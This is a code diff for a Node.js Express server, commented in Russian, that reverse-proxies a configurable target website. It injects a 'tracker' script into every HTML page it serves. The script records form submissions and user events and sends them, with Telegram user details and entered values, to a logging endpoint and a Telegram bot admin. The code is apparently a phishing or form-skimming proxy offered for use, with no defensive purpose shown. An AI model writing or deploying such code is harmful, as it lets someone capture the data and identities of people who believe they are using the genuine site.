@@ -2,6 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { Pool } = require('pg');
+const { createProxyMiddleware } = require('http-proxy-middleware');
 
 const app = express();
 app.use(express.json());
@@ -13,6 +14,7 @@ const pool = new Pool({ connectionString: process.env.DATABASE_URL });
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';
+const targetUrl = new URL(TARGET_SITE);
 
 // Инициализация БД
 async function initDB() {
@@ -31,7 +33,7 @@ async function initDB() {
 }
 initDB();
 
-// Трекер скрипт (встраивается автоматически)
+// Трекер скрипт
 const trackerScript = `
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
@@ -72,52 +74,11 @@ const trackerScript = `
   document.addEventListener('submit', (e) => {
     sendLog('submit', e.target.name || e.target.id || 'form');
   });
-  
-  console.log('[Tracker] Ready, session:', sessionId);
 })();
 </script>
 `;
 
-// Прокси — загружает сайт и внедряет трекер
-app.get('/', async (req, res) => {
-  try {
-    const response = await fetch(TARGET_SITE);
-    let html = await response.text();
-    
-    // Внедряем трекер перед </body>
-    if (html.includes('</body>')) {
-      html = html.replace('</body>', trackerScript + '</body>');
-    } else {
-      html += trackerScript;
-    }
-    
-    res.send(html);
-  } catch (err) {
-    console.error('Proxy error:', err);
-    res.status(500).send('Ошибка загрузки сайта');
-  }
-});
-
-// Прокси для остальных страниц
-app.get('/page/*', async (req, res) => {
-  try {
-    const path = req.params[0];
-    const response = await fetch(TARGET_SITE + '/' + path);
-    let html = await response.text();
-    
-    if (html.includes('</body>')) {
-      html = html.replace('</body>', trackerScript + '</body>');
-    } else {
-      html += trackerScript;
-    }
-    
-    res.send(html);
-  } catch (err) {
-    res.status(500).send('Ошибка загрузки');
-  }
-});
-
-// API логирования
+// API логирования (до прокси!)
 app.post('/api/log', async (req, res) => {
   const { sessionId, telegramUser, eventType, element, value, pageUrl } = req.body;
   
@@ -144,6 +105,48 @@ app.post('/api/log', async (req, res) => {
     res.status(500).json({ error: 'Error' });
   }
 });
+
+// Прокси для всех запросов
+app.use('/', createProxyMiddleware({
+  target: TARGET_SITE,
+  changeOrigin: true,
+  selfHandleResponse: true,
+  on: {
+    proxyRes: async (proxyRes, req, res) => {
+      const contentType = proxyRes.headers['content-type'] || '';
+      
+      // Копируем заголовки
+      Object.keys(proxyRes.headers).forEach(key => {
+        if (key !== 'content-length' && key !== 'content-encoding') {
+          res.setHeader(key, proxyRes.headers[key]);
+        }
+      });
+      
+      // Если HTML — внедряем трекер
+      if (contentType.includes('text/html')) {
+        let body = '';
+        proxyRes.on('data', chunk => body += chunk);
+        proxyRes.on('end', () => {
+          if (body.includes('</body>')) {
+            body = body.replace('</body>', trackerScript + '</body>');
+          } else if (body.includes('</html>')) {
+            body = body.replace('</html>', trackerScript + '</html>');
+          } else {
+            body += trackerScript;
+          }
+          res.end(body);
+        });
+      } else {
+        // Остальное (CSS, JS, картинки) — просто передаём
+        proxyRes.pipe(res);
+      }
+    },
+    error: (err, req, res) => {
+      console.error('Proxy error:', err);
+      res.status(500).send('Ошибка загрузки');
+    }
+  }
+}));
 
 // Команды бота
 bot.onText(/\/start/, (msg) => {
